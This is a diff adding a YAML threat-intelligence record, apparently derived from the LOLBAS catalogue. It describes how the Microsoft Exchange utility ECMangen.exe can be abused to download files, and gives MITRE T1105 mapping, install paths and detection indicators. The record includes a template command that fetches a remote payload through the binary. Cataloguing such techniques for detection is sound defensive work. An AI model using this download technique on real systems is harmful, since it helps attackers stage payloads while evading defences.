@@ -1,0 +1,93 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL0VDTWFuZ2VuLnltbA/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: ECMangen.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: URL on a ECMangen command line
+commands:
+- template: ECMangen.exe {REMOTEURL}
+  comment: Downloads payload from remote server
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/ECMangen/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: ECMangen.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OtherMSBinaries/ECMangen.yml
+      command_source_index: 0
+      document_utf8: "---\nName: ECMangen.exe\nDescription: Command-line tool for managing certificates\
+        \ in Microsoft Exchange Server.\nAuthor: Avihay Eldad\nCreated: 2024-04-30\nCommands:\n  - Command:\
+        \ ECMangen.exe {REMOTEURL}\n    Description: Downloads payload from remote server\n    Usecase:\
+        \ It will download a remote payload and place it in INetCache\n    Category: Download\n    Privileges:\
+        \ User\n    MitreID: T1105\n    OperatingSystem: Windows\n    Tags:\n      - Download: INetCache\n\
+        Full_Path:\n  - Path: C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\ECMangen.exe\n\
+        \  - Path: C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\x64\\ECMangen.exe\n\
+        \  - Path: C:\\Program Files\\Microsoft\\Exchange Server\\<version>\\Bin\\ECMangen.exe\n  - Path:\
+        \ C:\\Program Files\\Microsoft\\Exchange Server\\Bin\\ECMangen.exe\n  - Path: C:\\Program Files\\\
+        Microsoft\\Exchange Server\\ClientAccess\\Bin\\ECMangen.exe\n  - Path: C:\\ExchangeServer\\Bin\\\
+        ECMangen.exe\nDetection:\n  - IOC: URL on a ECMangen command line\n  - IOC: ECMangen making unexpected\
+        \ network connections or DNS requests\nAcknowledgement:\n  - Person: Avihay Eldad\n    Handle:\
+        \ '@AvihayEldad'\n"
+      document_sha256: sha256:4199430e2468dfb6c11c5db1958df4314f59159026f19e2967ab8743ca2a180c
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/ECMangen/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:c826207cea2e37eaa520375b24fcd222fa0bc96f8feb6f6c0e4a71b4afedd3c9
